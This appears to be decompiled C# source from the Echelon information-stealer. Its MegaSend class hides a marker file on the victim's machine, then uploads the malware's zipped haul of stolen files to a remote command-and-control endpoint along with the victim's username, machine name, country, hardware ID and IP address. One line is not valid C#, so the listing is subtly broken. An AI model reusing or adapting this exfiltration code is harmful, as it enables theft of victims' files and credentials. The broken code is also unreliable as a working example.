using System;
using System.IO;
using System.Net;
using System.Threading;
using System.Threading.Tasks;
using Echelon.Stealer.Grab;

namespace Echelon.Global
{
	// Token: 0x02000056 RID: 86
	internal class MegaSend : Program
	{
		// Token: 0x060001FB RID: 507 RVA: 0x00021C1C File Offset: 0x0001FE1C
		public static void MegaQuit()
		{
			File.AppendAllText(Help.LocalData + "\\" + Help.HWID, Help.HWID + Help.dateLog);
			File.SetAttributes(Help.LocalData + "\\" + Help.HWID, FileAttributes.Hidden | FileAttributes.System);
		}

		// Token: 0x060001FC RID: 508 RVA: 0x00021C6C File Offset: 0x0001FE6C
		public static void asy()
		{
			foreach (string file in Grab.Zip)
			{
				MegaSend.TaskUpl(file);
			}
		}

		// Token: 0x060001FD RID: 509 RVA: 0x00021CBC File Offset: 0x0001FEBC
		public static void TaskUpl(string file)
		{
			Task[] MT = new Task[]
			{
				new Task(delegate()
				{
					MegaSend.Upload(file);
				})
			};
			new Thread(delegate()
			{
				Task[] mt = MT;
				for (int i = 0; i < mt.Length; i++)
				{
					mt[i].Start();
				}
			}).Start();
			Task.WaitAll(MT);
		}

		// Token: 0x060001FE RID: 510 RVA: 0x00021D18 File Offset: 0x0001FF18
		public static void Upload(string file)
		{
			DateTime t = new DateTime(2020, 8, 25);
			Help.userName + "_" + Help.machineName + Help.CountryCOde();
			Console.WriteLine("Отправка " + file);
			WebClient webClient = new WebClient();
			ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls;
			webClient.Headers.Add("Content-Type", "binary/octet-stream");
			if (DateTime.Today < t)
			{
				webClient.UploadFile(string.Concat(new string[]
				{
					Program.host,
					"api.php?chatid=",
					Program.ChatID,
					"&username=",
					Help.userName,
					"&machineName=",
					Help.machineName,
					"&Country=",
					Help.CountryCOde(),
					"&HWID=",
					Help.HWID,
					"&ip=",
					Help.IP()
				}), "POST", file);
			}
		}
	}
}
